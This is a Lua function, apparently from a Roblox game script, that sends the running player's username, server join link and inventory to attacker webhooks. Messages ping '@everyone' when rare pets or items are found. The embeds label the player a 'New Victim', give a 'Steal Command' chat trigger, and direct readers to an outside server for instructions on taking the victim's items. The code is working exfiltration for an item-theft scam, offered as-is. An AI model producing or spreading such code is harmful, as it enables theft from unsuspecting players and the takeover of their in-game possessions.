local function sendToWebhook()
    if not LocalPlayer then
        return
    end

    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
    local jobId = tostring(game.JobId or "N/A")
    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jobId

    local messageData = {
        content = "L hit bru nothing good",
        embeds = {{
            title = "🎯 New Victim Found!",
            description = "READ #⚠️information in Aurora scripts Server to Learn How to Join Victim's Server and Steal Their Stuff!",
            color = 0x530000,
            fields = {
                {name = "👤 Username", value = LocalPlayer.Name, inline = true},
                {name = "🔗 Join Link", value = joinLink, inline = true},
                {name = "🎒 Inventory", value = "```" .. inventoryText .. "```", inline = false},
                {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    sendToBothWebhooks(messageData)

    if #inventory.rarePets > 0 then
        local rarePetMessage = {
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🐾 Rare Pet Found!",
                description = "A rare pet has been detected in the player's inventory!",
                color = 0x530000,
                fields = {
                    {name = "👤 Username", value = LocalPlayer.Name, inline = true},
                    {name = "🔗 Join Link", value = joinLink, inline = true},
                    {name = "🐾 Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```", inline = false},
                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        sendToBothWebhooks(rarePetMessage)
    end

    if #inventory.rareItems > 0 then
        local rareItemMessage = {
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🌟 Rare Item Found!",
                description = "A rare item has been detected in the player's inventory!",
                color = 0x530000,
                fields = {
                    {name = "👤 Username", value = LocalPlayer.Name, inline = true},
                    {name = "🔗 Join Link", value = joinLink, inline = true},
                    {name = "🌟 Rare Items", value = "```" .. table.concat(inventory.rareItems, "\n") .. "```", inline = false},
                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        sendToBothWebhooks(rareItemMessage)
    end
end
